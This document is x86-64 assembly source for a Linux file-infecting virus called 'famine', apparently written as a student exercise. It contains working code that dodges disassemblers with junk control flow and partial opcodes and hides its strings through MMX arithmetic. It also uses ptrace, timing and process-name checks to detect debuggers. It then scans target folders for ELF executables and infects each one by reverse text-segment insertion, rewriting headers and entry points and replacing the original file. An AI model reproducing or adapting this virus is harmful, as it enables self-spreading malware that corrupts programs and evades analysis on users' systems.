%include "header.asm"
[BITS 64]
default rel

section .text
    global _famine

_famine:
    PUSH
    mov rbp, rsp

;-------------------------------------------------------------
;----------------------->OBFUSCATION<-------------------------
;-------------------------------------------------------------
; Starting with a little obfuscation
; we're simulating a function to call to false dissasembler :)
; It play arround with register and replace the top of the st
; ack so the ret will jump where we want
;-------------------------------------------------------------
obfu:
    push rax
    push rcx
    push rdx
    mov rcx, rsp
    mov rsp, rbp                ; reset stack frame
    pop rbp                     ; orignal  bp
    pop rax                     ; original ret
    lea rdx, [rel $ + 84]       ; offset from here
    push rdx                    ; replace ret
    push rdx                    ; stack align
    ret                         ; jmp to back_at_it

;-------------------------------------------------------------
; actual obfuscation, this will not be executed
; We're messing arround the control graph 
;-------------------------------------------------------------
ahahahaha:
    push rbp
    mov rbp, rsp
    xor rax, rax
    cmp rax, rax
    je j0
    cmp rax, rdi
    je j1
    add rax, 0x4242
    cmp rax, rsi
    je j2
    cmp rax, rdx
    je j3
    cmp rax, rcx
    je j4
    jmp [rel $ + 0x84]
j0:
    jmp [rel $ + 46]
j1:
    jmp [rel $ + 72]
j2:
    jmp [rel $ + 128]
j3:
    jmp [rel $ + 256]
j4:
    jmp [rel $ + 512]

;-------------------------------------------------------------
; 2nd part of obfuscation
; restore everything
; we will add one more things before the jump we will use some
; incomplete instructions to false disassembler :)
;-------------------------------------------------------------
back_at_it:
    pop rdx
    push rax
    push rbp
    mov rbp, rsp
    mov rsp, rcx                  ;  rcx has real rsp
    pop rdx
    pop rcx
    pop rax
    push rax
    xor rax, rax
    jz begin

db 0x89 ; MOV opcode
db 0x84 ; MOD(2) - REG(3) - R/M(3)
; (10000100)
; (10 - 000 - 100)
;  |     |     | - - - - destination + operand
;  |     |
;  |     | - - RAX
;  |
;  | - - 4 signed bytes displacement

db 0xD9 ; SIB following MOD-REG-R/M
; (1101 1001)
; (11 - 011 - 001)
;  |     |     | - - - - RCX (base)
;  |     |
;  |     | - - RBX (index)
;  |
;  | - - 8 for scale (* 8)
; we're ommiting the 4 bytes displacement 
; to false disassembler :)
; completes instructions would have look like
; this : mov rax, [ rcx + (rbx * 8) + displacement ]


;-------------------------------------------------------------
;----------------->ANTI DEBUGGING techniques<-----------------
;-------------------------------------------------------------
; - Fork and checking if current process is traced
; - time elapsed between 2 block of codes
; - If specific process is running, in our case ('test')
;-------------------------------------------------------------

begin:
    pop rax
    sub rsp, FILE_SIZE + DIRENT + FSTAT + ENTRY + MAPPED_FILE

; ; ANTI DEBUG 2
    rdtsc                           ; get timestamp (EDX(high) - EAX(low))
    mov dword [rsp + 124], eax 

;-------------------------------------------------------------
; Fork and check if we're the tracers
;-------------------------------------------------------------

next:
    ; fork
    mov rax, 57
    syscall
    cmp rax, 0
    je child
;-------------------------------------------------------------
; Parent wait for status from child
; if WEXITSTATUS == 1, that's mean we're not the tracer
;-------------------------------------------------------------

    mov rdi, rax
    lea rax, [rsp]
    mov rsi, rax
    mov rdx, 0
    mov r10, 0
    mov rax, 61
    syscall
    mov eax, dword [rsp]
    and eax, 65280
    sar eax, 8
    cmp eax, 1
    jne anti_process

; -------------------------------------------------------------
; This will print a msg and exit when debugging.
; We're obfuscating code and literal string with MMX,
; here we add two values to get what we want like this :
; 44 45  42 55 47 47 49 4e 47 2e 2e 0a = "DEBUGGING..\n"
; 24 19  22 1f 0c 2a 48 3a 0e 1e 05 01
; 20 2c  20 36 3b 1d 01 14 39 10 29 09
; -------------------------------------------------------------
    mov rcx, 0x42422a0c1f221924
    movq mm0, rcx
    mov rcx, 0x42421d3b36202c20
    movq mm1, rcx
    paddusb mm0, mm1
    movq rcx, mm0
    emms                        ; clear mmx
    shl rcx, 0x10
    shr rcx, 0x10
    mov [rsp], rcx

    mov rcx, 0x424201051e0e3a48
    movq mm2, rcx
    mov rcx, 0x4242092910391401
    movq mm3, rcx
    paddusb mm2, mm3
    movq rcx, mm2
    emms                        ; clear mmx
; Here we need to remove the 0x4242 \O/.
    shl rcx, 0x10
    shr rcx, 0x10
    mov [rsp + 6], rcx
    xor rdi, rdi
    inc rdi
    lea rsi, [rsp]
    mov rdx, 13
    mov rax, SYS_WRITE
    syscall
    mov rax, SYS_EXIT
    mov rdi, 1
    syscall

;-------------------------------------------------------------
; Child code
;-------------------------------------------------------------
child:
; ptrace(PTRACE_ATTACH, ppid, 0 0);
; if attach is successful the traced process has to be continued
    mov rax, 110
    syscall
    mov rdi, 16
    mov rsi, rax
    mov rdx, 0
    mov r10, 0
    mov rax, SYS_PTRACE
    syscall
    test rax, rax
    jns child_wait
; We're not the tracee exit
    mov rdi, 1
    mov rax, SYS_EXIT
    syscall
; Resume the traced process
child_wait:
    mov rax, 110
    syscall
; waitpid(ppid, 0, 0)
    mov rdi, rax
    mov rsi, 0
    mov rdx, 0
    mov r10, 0
    mov rax, 61
    syscall
; ptrace(PTRACE_CONT, ppid, 0, 0)
    mov rdi, 7
    xor rsi, rsi
    xor rdx, rdx
    xor r10, r10
    mov rax, SYS_PTRACE
    syscall
    mov rax, 110
    syscall
; ptrace(PTRACE_DETACH, ppid, 0, 0)
    mov rdi, 17
    mov rsi, rax
    xor rdx, rdx
    xor r10, r10
    mov rax, SYS_PTRACE
    syscall
; child exit
    mov rdi, 0
    mov rax, SYS_EXIT
    syscall
;-------------------------------------------------------------
; Search in `/proc/` dir a process with name `test` in
; the cmdline file.
;-------------------------------------------------------------
anti_process:
; little obfuscation to prevent literal strings in analysis
    mov rcx, 0x252345603525
    mov rax, 0x0a402a123b0a
    add rax, rcx        
    mov [rsp], rax              ; rax = '/proc/'
    lea rdi, [rsp]
    mov rsi, 0x10800            ; O_RDONLY | O_DIRECTORY
    mov rax, SYS_OPEN
    syscall
    cmp rax, 0
    jl clean
    mov r14b, al
;-------------------------------------------------------------
; Allocate an arbitry size to use for getdents
; mmap(void *addr, size_t len, int prot, int flags, int fd, off_t offset);
;-------------------------------------------------------------
    xor rdi, rdi                ; 0
    mov rsi, 0x10000            ; arbitry.
    mov rdx, 0x3                ; PROT_READ | PROT_WRITE
    mov r10, 34                 ; MAP_PRIVATE | MAP_ANON
    mov r8, -1
    mov r9, 0
    mov rax, 9
    syscall
    mov [rsp + 32], rax
    ; mov [rsp + 40], word 0
;-------------------------------------------------------------
; ssize_t getdents64(int fd, void *dirp, size_t count);
;-------------------------------------------------------------
    mov rsi, [rsp + 32]
    movzx rdi, r14b
    mov rax, SYS_GETDENTS
    mov rdx, 0x10000
    syscall
    cmp rax, 0
    jl clean_anti_process
;-------------------------------------------------------------
; Iterate over each entries, search for folder with an integer
; as first character, if found read the `cmdline` file and che
; ck if the last 5 bytes is equal to '/test'.
;-------------------------------------------------------------
    mov rcx, rax                                    ; COUNT
    mov rdx, [rsp + 32]
    xor r15, r15                                    ;
    .search_pid:
        cmp rcx, r15
        je  clean_anti_process
        mov [rsp + 72], rdx
        mov [rsp + 80], rcx
        cmp byte [rdx + LDIRENT_64.d_type], 0x4     ; DT_DIR
        jne .inc
        cmp byte [rdx + LDIRENT_64.d_name], 0x30    ; '0'
        jl .inc
        cmp byte [rdx + LDIRENT_64.d_name], 0x39    ; '9'
        jg .inc

    mov rax, [rdx + LDIRENT_64.d_name]
    mov [rsp + 6], rax
    xor rax, rax
; concat /proc/<name>
    .concat:
        cmp byte [rsp + 7 + rax], 0
        je .read_proc
        add rax, 1
        jmp .concat

    .read_proc:
; Obfuscation for literal string
        mov rdx, 0x415f3141322f221f
        mov rsi, 0x240f382b323e4110
        add rdx, rsi
        mov [rsp + 7 + rax], rdx
        lea rdi, [rsp]
        mov rsi, 0x0
        mov rdx, 0
        mov rax, SYS_OPEN
        syscall
        cmp rax, 0
        jl .inc
        mov r8, rax
        mov rdi, rax
        lea rsi, [rsp + 42]
        mov rdx, 30           ; read 30
        mov rax, SYS_READ
        syscall
        cmp rax, 5            ; atleast 5 bytes
        jl .cleanup_fd
        mov rcx, 5
        lea rdi, [rsp + 42]
;-------------------------------------------------------------
; There we jump to buffer[len - 6]  to compare the last 6 bytes
;-------------------------------------------------------------
        sub rax, 6  
        add rdi, rax
        mov rax, 0x00747365742f
        mov [rsp + 24], rax
        lea rsi, [rsp + 24]
        cld
; Compare both strings
        repe cmpsb
        je proc_found
    .cleanup_fd:
        mov rdi, r8
        mov rax, SYS_CLOSE
        syscall
    .inc:
        mov rdx, [rsp + 72]
        mov rcx, [rsp + 80]
        movzx rax, word [rdx + LDIRENT_64.d_reclen]
        add r15, rax
        add rdx, rax
        jmp .search_pid

;-------------------------------------------------------------
; The `test` process is running, before leaving we must clean
; what we use
;-------------------------------------------------------------
proc_found:
    mov rdi, r8
    mov rax, SYS_CLOSE
    syscall
    mov [rsp + 40], word 1

clean_anti_process:
    mov rdi, r14
    mov rax, SYS_CLOSE
    syscall
    mov rdi, [rsp + 32]
    mov rsi, 0x10000
    mov rax, SYS_MUNMAP
    syscall
    mov ax, word [rsp + 40]
    cmp ax, 0
    jne clean

;-------------------------------------------------------------
; 'test' isnt running, we will compute time elapsed since our
; first rdtsc, if superior to FFF, assumes that the program
; is running under some sort of debugger
;-------------------------------------------------------------
    rdtsc                       ; get another timestamp
    mov ecx, dword [rsp + 124]  ; last timestamp save
	sub eax, ecx                ; compute elapsed ticks
	cmp eax, 0xFFFFF
	jl launch
    jmp clean

;-------------------------------------------------------------
;-------------------------> FAMINE <--------------------------
;-------------------------------------------------------------
; This is the actual start of the virus, we must clear the 
; stack from the executed block aboves, only [rsp 0-128]
; has been used so far, i should use 2 stack frames maybe?
launch:
    mov rcx, 128
    memset [rsp], rcx
    mov r14b, 1

;-------------------------------------------------------------
; Here we will choose target dir, iterate over each file and
; infect them
;-------------------------------------------------------------
target_dir:
    .f1:
        lea rdi, [rel hook.folder_1]
        jmp open_dir
    .f2:
        mov r14b, 0
        lea rdi, [rel hook.folder_2]

open_dir:
    xor rsi, rsi                                    ; O_RDONLY
    mov rax, SYS_OPEN
    syscall
    cmp rax, 0
    jl next_dir    

    mov rdi, rax
    mov rax, SYS_GETDENTS
    mov rsi, rsp
    add rsi, 256                                    ; OFFSET
    mov rdx, DIRENT
    syscall
    mov r13, rax
    mov rax, SYS_CLOSE
    syscall
    xor rbx, rbx                                    ; new OFFSET

;-------------------------------------------------------------
; Looking for DT_REG file in the current target DIR
;-------------------------------------------------------------
find_file:
    cmp rbx, r13
    jge next_dir
    lea rsi, [rsp + 256]                             ; OFFSET
    add rsi, rbx                                     ; current offset
    add rsi, LDIRENT_64.d_type
    cmp byte [rsi], 0x8                              ; DT_REG
    jne next_file

    lea  rdi, [rsp + 256 + rbx + LDIRENT_64.d_name]

;-------------------------------------------------------------
; File is DT_REG
; Here we concat FOLDER path and filename and store it on
; stack, FILENAME up to 256 bytes even if its probably
; never gonna happens :)
;-------------------------------------------------------------
target_file:
    mov rax, rdi
    lea rdi, [rsp]
    cmp r14b, 1
    je .ff1
    cmp r14b, 0
    je .ff2
    .ff1:
        lea rsi, [rel hook.folder_1]
        jmp .path_dir
    .ff2:
        lea rsi, [rel hook.folder_2]
    .path_dir:
        movsb
        cmp byte [rsi], 0
        jne .path_dir
    mov rsi, rax
    .append_file:
        movsb
        cmp byte [rsi], 0
        jne .append_file

;-------------------------------------------------------------
; get FD and SIZE of file and map it in memory
;-------------------------------------------------------------
validate_target:
    lea rdi, [rsp]                                   ; filename
    mov rax, SYS_OPEN
    mov rsi, 0x0                                     ; O_RDONLY
    syscall
    cmp rax, 0
    jle next_file
    mov rdi, rax
    mov r15, rax
    mov rsi, rsp
    add rsi, FILE_SIZE + DIRENT
    mov rax, SYS_FSTAT
    syscall
    cmp rax, 0
    jne next_file

map_target:
    mov rdi, 0x0
    mov rsi, QWORD [rsp + FILE_SIZE + DIRENT + 48]          ; filesz
    mov rdx, 0x3                                            ; READ | WRITE
    mov r10, 0x0002                                         ; MAP_PRIVATE
    mov r8, r15                                             ; fd
    mov r9, 0                                               ; offset
    mov rax, 9
    syscall
    mov [rbp - 16], rax                                     ; store mapped file

;-------------------------------------------------------------
; Checking for 7ELF, x86_64 ...
;-------------------------------------------------------------
elf_header:
    mov rsi, [rbp - 16]
    cmp dword [rsi], 0x464c457f                             ; 7fELF
    jne clear
    .exec:
        cmp word [rsi + Elf64_Ehdr.e_type], ET_EXEC        
        jne clear
    .machine:
        cmp word [rsi + Elf64_Ehdr.e_machine], 62           ; x86_64
        je elf_sign
    jmp clear

;-------------------------------------------------------------
; File already infected ?
;-------------------------------------------------------------
elf_sign:
    add rsi, FAMINE_SIZE + 0x6c                             ; offset signature
    lea rdi, [rel hook.SIGN]
    mov rcx, 38
    cld
    repe cmpsb
    je clear
; rsi = e_hdr

;-------------------------------------------------------------
; REVERSE TEXT INFECTION
;-------------------------------------------------------------
elf_phdr:
    mov rdx, [rbp - 16]
    mov rcx, [rdx + Elf64_Ehdr.e_entry]
    mov [rbp - 30], rcx                                     ; save entry point
    add rdx, [rdx + Elf64_Ehdr.e_phoff]
    PAGE_ALIGN FAMINE_SIZE                                  ; RCX
    add [rdx + phdr64.p_offset], rcx                        ; phdr[0]
    add [rdx + phdr64.p_offset + 0x38], rcx                 ; phdr[1]

;rdx = phdr[0]
patch_segtext:
    mov rsi, rcx
    mov rax, [rbp - 16]
    xor rcx, rcx
    mov cx, word [rax + Elf64_Ehdr.e_phnum]                 ; n phdr
    xor rax, rax
    .loop:
        cmp cx, 0
        je patch_hdr
        sub cx, 1
    .found:                                                 ; if text found
        cmp al, 1
        jne .compare
        add [rdx + phdr64.p_offset], rsi
    .compare:
; Look for segment text type  PT_LOAD
; Look for segment text flags R | X
        cmp dword [rdx + phdr64.p_type], PT_LOAD
        jne .keep
        cmp dword [rdx + phdr64.p_flags], 0x5               ; R | X
        jne .keep
        sub [rdx + phdr64.p_vaddr], rsi
        mov rdi, [rbp - 16]
        mov r8, [rdx + phdr64.p_vaddr]
; new entrypoint = (p_vaddr -  PAGE_ALIGN_UP(VIRUS_SIZE))
        mov [rdi + Elf64_Ehdr.e_entry], r8                 ; new entrypoint
        sub [rdx + phdr64.p_paddr], rsi
        add [rdx + phdr64.p_filesz], rsi
        add [rdx + phdr64.p_memsz], rsi
        mov al, 1
    .keep:
        add rdx, 0x38                                       ; next phdr
        jmp .loop

;-------------------------------------------------------------
; No text segment ?
;-------------------------------------------------------------
patch_hdr:
    test al, al
    je clear

; shift offset for section after famine insertion
patch_shdr:
    mov rax, [rbp - 16]                                     ;elf_ehdr
    add qword [rax + Elf64_Ehdr.e_entry], 0x40                    
    mov cx, word [rax + Elf64_Ehdr.e_shnum]                 ;n sections
    add rax, [rax + Elf64_Ehdr.e_shoff]                     ;sections[0]
    .loop:
        cmp cx, 0
        je .ehdr
        sub cx, 1
        add [rax + shdr64.sh_offset], rsi
        add rax, 0x40
        jmp .loop
    .ehdr:
        mov rax, [rbp - 16]
        add [rax + Elf64_Ehdr.e_shoff], rsi
        add [rax + Elf64_Ehdr.e_phoff], rsi
;-------------------------------------------------------------
; welcome new file before replacing the actual
; target file, it will mimic st_mode from the real file
;-------------------------------------------------------------
mimic:
    lea rdi, [rel hook.TMP]
    mov rsi, 577                                                   ; O_CREAT | O_WRONLY | O_TRUNC
    mov rdx, [rsp + FILE_SIZE + DIRENT + MAPPED_FILE + 16]         ; st_mode
    mov rax, SYS_OPEN
    syscall
    cmp rax, 0
    jl clear
    mov r8, rax
;write header
    write r8, [rbp - 16], 64
;write viruses
    write_rel r8, [rel _famine], FAMINE_SIZE

;-------------------------------------------------------------
; First execution of the virus will exit, but executed 
; in host we should jump back to host codd
; write opcode + entry from host 
; /!\ [RBP 22  - 30] contains host entry point.
;-------------------------------------------------------------
    mov [rbp - 32], word 0xb848                                     ; mov rax
    mov [rbp - 22], word 0xe0ff                                     ; jmp rax
;write vars
    write_rel r8, [rbp - 32], 0xc
    write_rel r8, [rel hook.folder_1], 70
;-------------------------------------------------------------
; Write remaining paddng accordnig to page size
;-------------------------------------------------------------
    PAGE_ALIGN FAMINE_SIZE
    sub rcx, FAMINE_SIZE
    sub rcx, 82                                                     ; jmp entry + vars
    mov r9, rcx
;-------------------------------------------------------------
; IDK if we can optimize that
;-------------------------------------------------------------
    .loop:
        cmp r9, 0
        je .keep
        mov rdi, r8
        lea rsi, [rel hook.null]
        mov rdx, 1
        mov rax, SYS_WRITE
        syscall
        sub r9, 1
        jmp .loop
; write rest of file
    .keep:
        mov rdi, r8
        mov rax, [rbp - 16]
        add rax, 0x40
        mov rsi, rax
        mov rdx, [rsp + FILE_SIZE + DIRENT + 48]        ; st_size
        sub rdx, 0x40
        mov rax, SYS_WRITE
        syscall

;-------------------------------------------------------------
; Replace original file
;-------------------------------------------------------------
rename:
    lea rdi, [rel hook.TMP]
    lea rsi, [rsp]
    mov rax, SYS_RENAME
    syscall

;-------------------------------------------------------------
; Cleanup the mess
;-------------------------------------------------------------
clear:
    mov rdi, [rbp - 16]
    mov rsi, [rsp + FILE_SIZE + DIRENT + 48]
    mov rax, SYS_MUNMAP                           
    syscall
    mov rdi, r8
    mov rax, SYS_CLOSE
    syscall

;-------------------------------------------------------------
; Iterate over each file
;-------------------------------------------------------------
next_file:
    mov rcx, FILE_SIZE
    memset [rsp], rcx                                       ; FILESIZE memset
    movzx r9, word [rsp + 256 + rbx + LDIRENT_64.d_reclen]  ; offset dirent + offset + d_reclen
    add rbx, r9
    jmp find_file

;-------------------------------------------------------------
; Iterate over each dir
;-------------------------------------------------------------
next_dir:
    mov rcx, DIRENT
    memset [rsp + 256], rcx                                ; dirent memset
    .next:
        cmp r14b, 1
        jge target_dir.f2

clean:
    add rsp, FILE_SIZE + DIRENT + FSTAT + ENTRY + MAPPED_FILE
    mov rsp, rbp
    POP
;-------------------------------------------------------------
; The next label below will not be included in host, it is only
; in the first execution of famine
;-------------------------------------------------------------

_v_stop:                                                   ; End of famine
    mov rax, SYS_EXIT 
    mov rdi, 0
    syscall

;-------------------------------------------------------------
; VARS
;-------------------------------------------------------------

hook:
    .folder_1:
        db FOLDER_1, 0
    .folder_2:
        db FOLDER_2, 0
    .TMP:
        db TMP, 0
    .SIGN:
        db SIGNATURE, 0
    .null:
        db 0
_end:
